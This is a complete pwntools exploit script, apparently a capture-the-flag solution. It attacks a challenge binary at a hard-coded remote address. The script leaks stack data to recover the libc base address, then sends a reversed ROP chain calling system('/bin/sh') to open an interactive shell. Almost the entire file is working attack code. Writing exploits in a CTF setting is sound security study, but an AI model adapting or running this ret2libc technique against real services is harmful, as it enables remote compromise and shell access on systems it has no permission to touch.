#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './chall_patched')

context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.arch = 'amd64'
context.log_level = 'debug' if args.DEBUG else 'info'
_, host, port = 'nc 117.53.46.98 9001'.split()

libc = ELF('./libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


def extract_leak(recv):
    '''Extract the leaked address from the received data.'''
    try:
        leak = list(map(lambda x: int(x,16), recv.split(b'|')[1:]))
        return leak
    except (IndexError, ValueError):
        log.error("Failed to extract leak from: {}".format(recv))
        return None
    

def addrx(func, x):
    '''Show func in hex'''
    log.info(f'{func}: {x}')


gdbscript = '''
b *(main+411)
continue
'''.format(**locals())

p = start()
from pwn import *

# b = reads 2 bytes from rsp, a = writes 2 bytes to rsp
program = b"b"*28 + b"a"*16 + b"c"
program = program.ljust(0x1000, b"\n")


p.send(program)
sleep(0.5)
dump = p.recv(200)[::-1].hex()
log.info(dump)

# libc leak
libc_idx = dump.index('1ca')-9
leak = eval('0x' + dump[libc_idx:libc_idx+12])
libc.address = leak - (libc.sym.__libc_start_call_main+122)
log.info(f'libc: {libc.address:#x}')

# rop
rop = ROP(libc)
ret  = rop.find_gadget(['ret'])[0]
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
binsh = next(libc.search(b'/bin/sh\0'))
system = libc.sym.system

# payload is backwards
payload = flat(
    ret,
    pop_rdi_ret,
    binsh,
    system,
)[::-1]
    
p.send(payload)
p.interactive()